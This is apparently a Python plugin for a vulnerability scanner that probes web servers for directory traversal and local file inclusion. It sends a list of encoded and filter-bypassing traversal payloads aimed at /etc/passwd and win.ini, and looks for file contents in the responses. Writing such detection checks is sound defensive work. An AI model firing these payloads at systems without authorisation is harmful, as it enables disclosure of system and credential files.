import asyncio
import ssl
import urllib.parse
from plugins import NaslPlugin, PluginResult

class AdvancedDirectoryTraversalDetection(NaslPlugin):
    PLUGIN_ID = 1210
    NAME = 'Advanced Directory Traversal / LFI Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 8.6
    DESCRIPTION = 'Detects directory traversal and LFI vulnerabilities using advanced bypass techniques including URL encoding double encoding, UTF-8 overlong sequences, path truncation, and null byte injection. Tests bypasses of common filters.'
    SOLUTION = 'Use a basename() function to strip directory components. Deny paths containing .. character sequences. Use a whitelist of allowed files.'
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        traversal_params = ['file', 'page', 'path', 'include', 'template', 'doc', 'dir', 'folder', 'load', 'read']
        payloads = [
            '/etc/passwd',
            '../etc/passwd',
            '..\\..\\windows\\win.ini',
            '%2e%2e%2fetc%2fpasswd',
            '..%252f..%252fetc%252fpasswd',
            '....//....//etc/passwd',
            '%c0%ae%c0%ae%c0%aff',
            '..;/etc/passwd',
            '/etc/passwd%00',
        ]
        indicators = [b'root:', b'[extensions]', b'boot loader', b'/bin/bash', b'nobody:', b'daemon:']
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for param in traversal_params:
                    for payload in payloads:
                        encoded_payload = urllib.parse.quote(payload, safe='')
                        path = f'/?{param}={encoded_payload}'
                        req = f'GET {path} HTTP/1.1\r\nHost: {host_header}\r\nConnection: close\r\n\r\n'
                        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5)
                        writer.write(req.encode())
                        await writer.drain()
                        resp = b''
                        try:
                            while True:
                                chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                if not chunk: break
                                resp += chunk
                                if len(resp) > 8192: break
                        except asyncio.TimeoutError:
                            pass
                        writer.close()
                        await writer.wait_closed()

                        if resp:
                            body = resp.split(b'\r\n\r\n', 1)[-1] if b'\r\n\r\n' in resp else resp
                            for indicator in indicators:
                                if indicator in body:
                                    results.append(PluginResult(vulnerable=True, target=target, port=port_to_check, description=f'LFI detected via param {param} with payload {payload}'))
                                    return results
                results.append(PluginResult(vulnerable=False, target=target, port=port_to_check, description='No directory traversal detected'))
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                results.append(PluginResult(vulnerable=False, target=target, port=port_to_check, description='Connection failed'))
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description='No issues detected'))
        return results
